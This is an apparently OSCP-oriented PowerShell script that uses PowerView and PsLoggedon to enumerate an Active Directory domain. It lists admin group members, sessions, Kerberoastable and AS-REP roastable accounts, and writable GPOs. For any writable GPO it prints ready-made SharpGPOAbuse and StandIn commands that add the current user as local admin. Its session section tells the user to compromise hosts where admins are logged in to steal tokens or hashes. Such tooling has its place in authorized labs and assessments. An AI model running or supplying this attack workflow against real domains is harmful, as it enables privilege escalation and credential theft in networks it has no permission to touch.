# =============================================================
# AD ENUM REPORT (OSCP STYLE - ULTIMATE ASSEMBLY)
# powershell -NoProfile -ExecutionPolicy Bypass -File ./adenum.ps1
# Prerequisite: PowerView.ps1 & PsLoggedon64.exe
# =============================================================

$outfile = "$env:USERPROFILE\ad_enum_report.txt"
Remove-Item $outfile -ErrorAction SilentlyContinue

function write-section {
    param($title)
    Add-Content $outfile "`n========== $title =========="
}

Write-Host "[+] Saving report to $outfile"

# ===============================
# LOAD POWERVIEW
# ===============================
if (-not (Get-Command Get-DomainUser -ErrorAction SilentlyContinue)) {
    try {
        . .\PowerView.ps1
    } catch {
        Write-Host "[!] PowerView.ps1 not found!"
        exit
    }
}

# Pre-fetch domain data untuk efisiensi
$domainObj = Get-Domain
$domainName = $domainObj.Name
$dnsRoot = $domainObj.dnsroot

# ===============================
# 1. HOSTS
# ===============================
write-section "HOSTS"
$hosts = Get-DomainComputer -Properties dnshostname, OperatingSystem
if ($hosts) {
    foreach ($h in $hosts) {
        $ip = ""
        try { $ip = ([System.Net.Dns]::GetHostAddresses($h.dnshostname) | Where-Object {$_.AddressFamily -eq "InterNetwork"} | Select -First 1).IPAddressToString } catch {}
        "$($h.dnshostname);$($h.OperatingSystem);$ip" | Add-Content $outfile
    }
}

# ===============================
# 2. USERS
# ===============================
write-section "USERS"
Get-DomainUser -Properties samaccountname | ForEach-Object { "$($_.samaccountname)@$domainName" } | Add-Content $outfile

# ===============================
# 3. ADMIN GROUP MEMBERS (RECURSIVE)
# ===============================
write-section "ADMIN GROUP MEMBERS (BLOODHOUND STYLE)"
$currentSID = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
$currentUser = whoami
$targetGroups = @("Domain Admins", "Administrators", "Enterprise Admins")
$allAdmins = @()

foreach ($groupName in $targetGroups) {
    $admins = Get-DomainGroupMember -Identity $groupName -Recurse -ErrorAction SilentlyContinue
    if ($admins) {
        $allAdmins += $admins
        Add-Content $outfile "--- Group: $groupName ---"
        foreach ($a in $admins) {
            $line = "$($a.MemberName) ($($a.ObjectClass));$($a.MemberSID)"
            if ($a.MemberSID -eq $currentSID -or $a.MemberName -match $currentUser) { $line = "[CURRENT ADMIN] $line" }
            Add-Content $outfile $line
        }
    }
}

# ===============================
# 4. RELEVANT GROUPS (FILTERED)
# ===============================
write-section "RELEVANT GROUPS"
$valuableKeywords = "Admin|Remote|Desktop|SQL|Backup|GPO|Exchange|SharePoint|VPN|IT|Dev"
Get-DomainGroup -Properties Name, Description | Where-Object { $_.Name -match $valuableKeywords } | ForEach-Object {
    "$($_.Name) -- Description: $($_.Description)" | Add-Content $outfile
}

# ===============================
# 5. GPO EXPLOITABILITY (SharpGPOAbuse Ready)
# ===============================
write-section "GPO EXPLOITABILITY"
$gpos = Get-DomainGPO
$me = whoami
$foundExploit = $false
$exploitableGPONames = @() # Untuk menampung nama GPO yang kena hit

if ($gpos) {
    $domainLinks = (Get-DomainObject -SearchScope Base).gplink
    $ous = Get-DomainOU
    $sites = Get-DomainSite

    foreach ($gpo in $gpos) {
        $acls = Get-DomainObjectAcl -Identity $gpo.distinguishedname -ResolveGUIDs | Where-Object {
            $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|DeleteChild|DeleteTree|WriteDacl|WriteOwner"
        }
        foreach ($acl in $acls) {
            $identity = ""
            try { $identity = ConvertFrom-SID $acl.SecurityIdentifier } catch { continue }
            if ($identity -ne $me) { continue }

            $scope = @()
            if ($domainLinks -like "*$($gpo.name)*") { $scope += "Domain" }
            foreach ($ou in $ous) { if ($ou.gplink -like "*$($gpo.name)*") { $scope += "OU:$($ou.name)" } }
            foreach ($site in $sites) { if ($site.gplink -like "*$($gpo.name)*") { $scope += "Site:$($site.name)" } }
            $scopeStr = if ($scope.Count -eq 0) { "Not Linked" } else { $scope -join "," }

            $foundExploit = $true
            $exploitableGPONames += $gpo.displayname # Simpan nama GPO

            Add-Content $outfile "------------------------------------"
            Add-Content $outfile "[!] EXPLOITABLE GPO FOUND"
            Add-Content $outfile "User    : $identity"
            Add-Content $outfile "GPO     : $($gpo.displayname)"
            Add-Content $outfile "Rights  : $($acl.ActiveDirectoryRights)"
            Add-Content $outfile "Scope   : $scopeStr"
            Add-Content $outfile "------------------------------------"
        }
    }
}

# Blok instruksi ini HANYA akan diprint jika $foundExploit bernilai $true
if ($foundExploit) {
    Add-Content $outfile "`n[!] ATTACK RECOMMENDATION [!]"
    Add-Content $outfile "Choose attack method for the discovered GPOs:"
    
    foreach ($targetGPO in ($exploitableGPONames | Select-Object -Unique)) {
        Add-Content $outfile "`n>>> Target: $targetGPO"
        
        Add-Content $outfile "    Option A - SharpGPOAbuse"
        Add-Content $outfile "    SharpGPOAbuse.exe --AddLocalAdmin --UserAccount $me --GPOName '$targetGPO'"
        
        Add-Content $outfile "    Option B - StandIn"
        Add-Content $outfile "    StandIn.exe --gpo --filter '$targetGPO' --localadmin $me"
    }
} else {
    Add-Content $outfile "[+] No exploitable GPO rights found for current user"
}

# =============================================================
# 6. ACTIONABLE QUERIES (OPTIMIZED SESSION HUNTING)
# =============================================================
write-section "LATERAL MOVEMENT & SESSIONS"

# --- 1. Local Admin Access ---
$localAdminFound = $false
Find-LocalAdminAccess -ErrorAction SilentlyContinue | ForEach-Object { 
    Add-Content $outfile "[+] LOCAL ADMIN ACCESS FOUND: $_"
    $localAdminFound = $true
}
if (-not $localAdminFound) { Add-Content $outfile "Find Local Admin Access: Not found" }

# --- 2. Shortest Path (Admin Session Hunting) ---
# Ini adalah pengganti SHORTEST PATH yang lebih cepat
$pathFound = $false
$allSessions = Get-NetSession -ErrorAction SilentlyContinue
if ($allAdmins -and $allSessions) {
    $uniqueAdminNames = $allAdmins.MemberName | Select-Object -Unique
    foreach ($adminName in $uniqueAdminNames) {
        $foundSessions = $allSessions | Where-Object { $_.UserName -match $adminName }
        if ($foundSessions) {
            foreach ($s in $foundSessions) {
                $pathFound = $true
                Add-Content $outfile "[*] SHORTEST PATH FOUND: Admin [$adminName] is logged into [$($s.ComputerName)]"
                Add-Content $outfile "    -> Action: Compromise $($s.ComputerName) to steal Admin Token/Hash!"
            }
        }
    }
}
if (-not $pathFound) { Add-Content $outfile "Shortest Path to Admin (Sessions): Not found" }

# --- 3. RDP & Critical Local Admin Misconfiguration ---
$rdpRiskFound = $false
$critAdminFound = $false
$allComputers = $hosts.dnshostname

if ($allComputers) {
    foreach ($comp in $allComputers) {
        try {
            $rdp = Get-NetLocalGroupMember -ComputerName $comp -GroupName "Remote Desktop Users" -ErrorAction SilentlyContinue
            if ($rdp.MemberName -match "Domain Users") { 
                Add-Content $outfile "[!] RDP RISK: 'Domain Users' can RDP to $comp"
                $rdpRiskFound = $true
            }
            
            $localAdmins = Get-NetLocalGroupMember -ComputerName $comp -GroupName "Administrators" -ErrorAction SilentlyContinue
            if ($localAdmins.MemberName -match "Domain Users") { 
                Add-Content $outfile "[!!!] CRITICAL: 'Domain Users' is Local Admin on $comp"
                $critAdminFound = $true
            }
        } catch {}
    }
}

if (-not $rdpRiskFound) { Add-Content $outfile "Servers/Workstation where Domain Users can RDP: Not found" }
if (-not $critAdminFound) { Add-Content $outfile "Computers where Domain Users are Local Admin: Not found" }

# ===============================
# 7. AS-REP ROASTING
# ===============================
write-section "AS-REP ROASTABLE USERS"
$asrep = Get-DomainUser -PreauthNotRequired -ErrorAction SilentlyContinue
if ($asrep) {
    $asrep | ForEach-Object { Add-Content $outfile "[!!!] AS-REP ROASTABLE: $($_.samaccountname) (No Pre-Auth Required!)" }
} else { Add-Content $outfile "Null" }

# ===============================
# 8. KERBEROASTABLE USERS
# ===============================
write-section "KERBEROASTABLE USERS"
$spnUsers = Get-DomainUser -SPN -ErrorAction SilentlyContinue
$noise = @("krbtgt", "kadmin")
if ($spnUsers) {
    foreach ($u in $spnUsers) {
        $sam = $u.samaccountname
        $tag = if ($allAdmins.MemberName -contains $sam) { "[!!! ADMIN !!!] " } elseif ($noise -contains $sam.ToLower()) { "[SYSTEM] " } else { "[USER ACCOUNT] " }
        Add-Content $outfile "$tag$sam@$dnsRoot;$($u.serviceprincipalname)"
    }
}

# ===============================
# 9. ACTIVE SESSIONS (PsLoggedon)
# ===============================
write-section "ACTIVE SESSIONS (PSLOGGEDON)"
$results = @()
foreach ($target in $allComputers) {
    $tmp = "$env:TEMP\pslog_$target.txt"
    try {
        cmd /c "PsLoggedon64.exe \\$target -accepteula > $tmp 2>&1"
        if (Test-Path $tmp) {
            Get-Content $tmp | Where-Object { $_ -match "\\" -and $_ -notmatch "Users logged on" } | ForEach-Object {
                $results += "$($target.Split('.')[0]);$($_.Trim())"
            }
            Remove-Item $tmp -ErrorAction SilentlyContinue
        }
    } catch {}
}
if ($results) { $results | Sort-Object -Unique | Add-Content $outfile } else { Add-Content $outfile "Null" }

# ===============================
# DONE
# ===============================
Write-Host "[+] DONE! Report saved to: $outfile"
